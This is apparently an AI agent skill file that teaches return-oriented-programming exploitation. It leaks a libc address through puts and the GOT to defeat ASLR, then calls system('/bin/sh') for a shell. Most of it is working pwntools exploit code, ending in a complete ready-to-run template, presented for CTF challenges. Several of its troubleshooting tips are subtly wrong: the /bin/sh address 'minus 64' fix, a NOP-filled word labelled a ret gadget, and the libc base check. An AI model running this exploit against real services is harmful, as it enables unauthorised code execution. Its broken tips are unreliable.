---
name: rop-libc-leak
description: How to create ROP exploits that leak libc addresses in binary exploitation challenges. Use this skill whenever the user mentions ROP, return-oriented programming, leaking libc, GOT/PLT exploitation, pwntools, binary exploitation, CTF challenges with buffer overflows, or needs to bypass ASLR by leaking libc addresses. This is essential for any binary exploitation task involving libc function calls, system(), or shellcode execution on modern protected binaries.
---

# ROP Libc Leak Exploitation

A skill for creating Return-Oriented Programming (ROP) exploits that leak libc addresses to bypass ASLR (Address Space Layout Randomization) in binary exploitation challenges.

## When to Use This Skill

Use this skill when:
- You have a buffer overflow vulnerability and need to leak libc addresses
- You're working on CTF challenges with ASLR protection
- You need to call libc functions like `system()`, `puts()`, or `printf()`
- The binary has a GOT (Global Offset Table) you can exploit
- You need to chain ROP gadgets to achieve code execution

## Core Concept

The exploit works in two stages:
1. **Leak Stage**: Use `puts()` or `printf()` to leak a libc function address from the GOT
2. **Exploit Stage**: Calculate libc base address and call `system("/bin/sh")`

## Prerequisites

- pwntools installed (`pip install pwntools`)
- The vulnerable binary
- Knowledge of the offset to overwrite the return address
- A libc library (can be found at https://libc.blukat.me/)

## Step-by-Step Exploitation

### Step 1: Setup and Connection

```python
from pwn import *

# Connection settings
LOCAL = True  # Set to False for remote
REMOTE = False

if LOCAL:
    p = process("./vuln")
    elf = ELF("./vuln")
else:
    p = remote("host", port)
    elf = ELF("./vuln")

# Initialize ROP
rop = ROP(elf)
```

### Step 2: Find the Offset

Use cyclic patterns to find where the return address is overwritten:

```python
from pwn import cyclic, cyclic_find

# Generate cyclic pattern
payload = cyclic(264) + b"AAAAAAAA"
p.sendline(payload)

# After crash, find the offset
# In GDB: x/wx $rsp to see the value
# Then: cyclic_find(0x61616161)  # Replace with actual value
```

### Step 3: Find Gadgets

```python
# Find pop rdi; ret gadget (needed to set function arguments)
POP_RDI = next(rop.gadgets.search(r'^pop rdi; ret$'))

# Get function addresses
PUTS_PLT = elf.plt['puts']  # or elf.plt['printf']
MAIN = elf.symbols['main']  # or find manually if stripped
```

### Step 4: Leak libc Address

```python
# Get address of puts in GOT
PUTS_GOT = elf.got['puts']

# Build ROP chain to leak
rop_chain = p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)

# Send payload
p.sendline(OFFSET + rop_chain)

# Receive leaked address
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked)}")
```

### Step 5: Calculate libc Base

```python
# Load the libc file
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Calculate base address
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")
```

### Step 6: Final Exploitation

```python
# Find /bin/sh and system
BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.symbols['system']

# Build final ROP chain
final_rop = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

# Send and get shell
p.sendline(OFFSET + final_rop)
p.interactive()
```

## Common Issues and Solutions

### Issue: `main` symbol not found

**Cause**: Binary is stripped (no symbols)

**Solution**: Find main address manually:

```bash
objdump -d vuln_binary | grep ".text"
```

Then set it manually:
```python
MAIN = 0x401080  # Replace with actual address
```

### Issue: `sh: 1: %s%s%s%s%s%s%s%s: not found`

**Cause**: `/bin/sh` address is misaligned (must be 16-byte aligned)

**Solution**: Subtract 64 bytes:

```python
BINSH = next(libc.search(b"/bin/sh")) - 64
```

### Issue: Wrong libc library

**Cause**: Using incorrect libc version

**Solution**: Verify libc base ends in `0x0`:

```python
if hex(libc.address)[-1] != '0':
    log.error("Wrong libc! Base should end in 0x0")
```

Find correct libc at https://libc.blukat.me/ using the leaked address.

### Issue: Payload alignment

**Cause**: Stack must be 16-byte aligned for some libc versions

**Solution**: Add padding:

```python
def align_payload(payload):
    if len(payload) % 16 == 0:
        return payload
    else:
        return payload + p64(0x9090909090909090)  # Add ret gadget
```

## Complete Template

```python
from pwn import *

# Configuration
OFFSET = 264  # Replace with actual offset
LOCAL = True

# Connection
if LOCAL:
    p = process("./vuln")
    elf = ELF("./vuln")
else:
    p = remote("host", port)
    elf = ELF("./vuln")

rop = ROP(elf)

# Gadgets
POP_RDI = next(rop.gadgets.search(r'^pop rdi; ret$'))
PUTS_PLT = elf.plt['puts']
MAIN = elf.symbols['main']

# Leak libc
PUTS_GOT = elf.got['puts']
leak_rop = p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)

p.sendline(b"A" * OFFSET + leak_rop)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))

# Calculate libc base
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = leaked - libc.symbols['puts']

# Exploit
BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.symbols['system']

exploit_rop = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
p.sendline(b"A" * OFFSET + exploit_rop)
p.interactive()
```

## Tips for Success

1. **Always verify the libc** - Wrong libc = wrong addresses = no shell
2. **Check for alignment** - Some libc versions require 16-byte stack alignment
3. **Use GDB** - Attach with `gdb.attach(p)` to debug locally
4. **Test locally first** - Before trying remote exploitation
5. **Handle echoes** - If the binary echoes input, account for it when receiving

## Tools

- `ROPgadget` - Find ROP gadgets: `ROPgadget --binary vuln | grep "pop rdi"`
- `one_gadget` - Find one-gadget shells: `one_gadget libc.so.6`
- `pwntools` - Python exploitation framework
- `libc.blukat.me` - Find libc from leaked addresses

## Security Note

This skill is for educational purposes and CTF challenges only. Only use these techniques on systems you own or have explicit permission to test.
